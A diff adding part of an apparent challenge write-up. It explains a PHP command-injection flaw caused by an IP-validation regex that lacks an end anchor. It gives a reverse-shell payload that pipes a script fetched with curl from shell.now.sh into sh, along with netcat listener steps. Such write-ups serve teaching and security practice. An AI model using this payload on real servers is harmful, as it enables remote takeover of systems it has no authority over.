@@ -40,4 +40,25 @@ A few points to note,
 
   That is, when the `Go!` button is clicked, the `check()` function will be calling `.submit()` right away to submit the form, without doing any validation against the input.
 
+- After the data is posted to the server, there is a second check being performed.
+`preg_match('/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])/',$ip)`
+  This check looks more promising, it does a decent job validating the IP address, which doesn't seem to expose any holes for exploitation.
+  However, if we look more colsely, the regex doesn't end with a anchor `$`. That means as long as the data begins with a valid IP address, the data will be considered valid. This is where makes it vulnerable.
+  
+Since the symbol `;` can be used in PHP to chain the commands, if the payload of the POST request is `1.1.1.1 ; command`, then we can actually trick PHP to execute the command on the web sever!
+
+Here, we will use the command to get a reverse shell from the web server, so the complete payload looks like,
+`1.1.1.1 ; curl https://shell.now.sh/52.18.79.59:5580 | sh`
+
+`https://shell.now.sh` is a HTTP endpoint that accept an `IP:PORT` as a path parameter, that the web server will be connecting to.
+
+In this demo, the machine to which the IP is attached is controlled by me, and the goal here is to instruct the web server to proactively connect to the `IP:PORT`, and present a shell on my machine, as if I am just SSH'ed into it.
+
+To achieve that, we just do,
+
+1. On my own machine, run `nc -lvp 80` to instruct it to listen on port 80.
+1. Fire up `Console` in the developer tool, change the `check()` function to what just shown above.
+1. Type in `1.1.1.1 ; curl https://shell.now.sh/52.18.79.59:5580 | sh` in the text box of the challenge website.
+1. Back to `Console`, key in `check();` and press Enter.
+
 
